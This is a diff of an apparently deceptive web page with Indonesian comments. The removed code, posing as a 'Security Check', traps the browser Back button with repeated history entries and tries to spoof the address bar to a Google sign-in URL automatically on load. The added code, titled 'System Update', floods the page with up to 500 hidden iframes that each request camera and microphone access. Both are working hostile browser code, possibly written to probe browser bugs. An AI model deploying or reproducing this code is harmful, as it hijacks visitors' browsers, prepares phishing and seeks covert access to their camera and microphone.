@@ -3,125 +3,118 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f4f6f8;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-    display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; flex-direction: column;
+    background: #000; color: #0f0;
+    font-family: monospace; overflow: hidden;
+    height: 100vh; display: flex; justify-content: center; align-items: center;
   }
-  .panel {
-    background: #fff; padding: 40px; border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 450px; width: 100%; z-index: 10;
-  }
-  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
-  p { color: #666; margin-bottom: 20px; font-size: 14px; }
-  button {
-    background: #007aff; color: #fff; padding: 15px;
-    border-radius: 8px; font-size: 16px; font-weight: bold;
-    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
-  }
-  button:hover { background: #005bb5; }
-  #log {
-    margin-top: 20px; background: #000; color: #0f0;
-    padding: 10px; font-family: monospace; font-size: 12px;
-    border-radius: 6px; width: 100%; max-width: 450px;
-    height: 150px; overflow-y: auto; text-align: left;
-  }
+  #status { font-size: 24px; text-align: center; z-index: 10000; position: relative; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
-<div class="panel">
-  <h1>🔒 Security Check</h1>
-  <p id="status">Klik tombol di bawah untuk memverifikasi.</p>
-  <button id="startBtn">Verify System</button>
-</div>
-
-<div id="log">Sistem siap...</div>
+<div id="status">Memulai Flooding...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var logEl = document.getElementById('log');
   var statusEl = document.getElementById('status');
-  
-  function log(msg) {
-    logEl.innerHTML += "> " + msg + "<br>";
-    console.log(msg);
-  }
+  var iframeCount = 0;
+  var maxIframes = 500; // Jumlah iframe (500 sudah sangat berat)
 
   // ============================================
-  // 1. HISTORY TRAP (TAB-NABBING)
+  // 1. PAYLOAD UNTUK SETIAP IFRAME (MEMINTA KAMERA)
   // ============================================
-  function trapHistory() {
-    log("[!] Memasang History Trap...");
-    
+  var iframePayload = `
+    <!DOCTYPE html>
+    <html>
+    <head><title>Permission</title></head>
+    <body style="background:transparent;margin:0;">
+      <script>
+        (function() {
+          // Paksa minta izin kamera di setiap iframe
+          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+              .then(function(stream) {
+                parent.postMessage({ status: 'CAM_GRANTED' }, '*');
+              })
+              .catch(function(err) {
+                // Abaikan error agar tidak crash
+              });
+          }
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
+
+  // ============================================
+  // 2. LISTENER: MENDETEKSI KEBOCORAN IZIN
+  // ============================================
+  window.addEventListener('message', function(e) {
+    if (e.data && e.data.status === 'CAM_GRANTED') {
+      statusEl.innerText = "🚨 BUG: PERMISSION LEAK DETECTED! 🚨";
+      statusEl.style.color = "#f00";
+      document.body.style.background = "#300";
+      console.log("[!] Permission Leak Detected! Camera Access Granted.");
+    }
+  });
+
+  // ============================================
+  // 3. FUNGSI MULTI-IFRAME FLOODING
+  // ============================================
+  function floodIframes() {
+    if (iframeCount >= maxIframes) {
+      statusEl.innerText = "Flooding Selesai. Memeriksa...";
+      return;
+    }
+
     try {
-      // Push state berulang kali untuk mengisi riwayat (History Hijacking)
-      for (var i = 0; i < 20; i++) {
-        history.pushState({ trap: i }, "Security Check", window.location.pathname + "#trap=" + i);
-      }
+      // Buat iframe baru
+      var iframe = document.createElement('iframe');
       
-      // Pasang event listener: Jika user menekan tombol Back, paksa maju lagi
-      window.onpopstate = function() {
-        log("[!] User mencoba Back. Menahan di halaman...");
-        history.go(1);
+      // Beri atribut allow untuk memancing prompt izin
+      iframe.allow = "camera; microphone; autoplay";
+      
+      // Set src ke about:blank agar bisa ditulis (Same-Origin)
+      iframe.src = 'about:blank';
+      
+      // Sembunyikan iframe
+      iframe.style.display = 'none';
+      
+      // Tambahkan ke DOM
+      document.body.appendChild(iframe);
+
+      // Tulis payload ke dalam iframe
+      iframe.onload = function() {
+        try {
+          var doc = iframe.contentDocument || iframe.contentWindow.document;
+          doc.open();
+          doc.write(iframePayload);
+          doc.close();
+        } catch(e) {}
       };
-      
-      log("[+] History Trap terpasang (20 entry).");
-      statusEl.innerText = "Terverifikasi. (Coba klik Back browser)";
-      
+
+      iframeCount++;
+      statusEl.innerText = "Membuat Iframe: " + iframeCount + "/" + maxIframes;
+
+      // Loop super cepat (0ms)
+      setTimeout(floodIframes, 0);
+
     } catch(e) {
-      log("[-] Gagal: " + e.message);
+      console.log("Flooding error:", e);
     }
   }
 
   // ============================================
-  // 2. UI SPOOFING (FAKE URL)
+  // 4. EKSEKUSI
   // ============================================
-  function spoofURL() {
-    log("[!] Mencoba UI Spoofing...");
-
-    var fakeUrl = "https://accounts.google.com/signin/v2/identifier";
-    
-    try {
-      // Percobaan 1: replaceState ke URL Google
-      history.replaceState({ spoof: true }, "Sign in - Google Accounts", fakeUrl);
-      log("[+] replaceState ke Google BERHASIL (BUG!).");
-    } catch(e) {
-      log("[-] replaceState diblokir (SecurityError).");
-    }
-
-    try {
-      // Percobaan 2: pushState ke URL Google
-      history.pushState({ spoof: true }, "Sign in - Google Accounts", fakeUrl);
-      log("[+] pushState ke Google BERHASIL (BUG!).");
-    } catch(e) {
-      log("[-] pushState diblokir (SecurityError).");
-    }
-  }
-
-  // ============================================
-  // 3. ZERO-CLICK TRIGGER (OTOMATIS SAAT LOAD)
-  // ============================================
-  window.addEventListener('load', function() {
-    setTimeout(trapHistory, 1000);
-    setTimeout(spoofURL, 2000);
-  });
-
-  // ============================================
-  // 4. TOMBOL VERIFIKASI
-  // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    trapHistory();
-    spoofURL();
-    statusEl.innerText = "Verifikasi selesai. Periksa Address Bar.";
-  });
+  setTimeout(floodIframes, 500);
 
 })();
 </script>
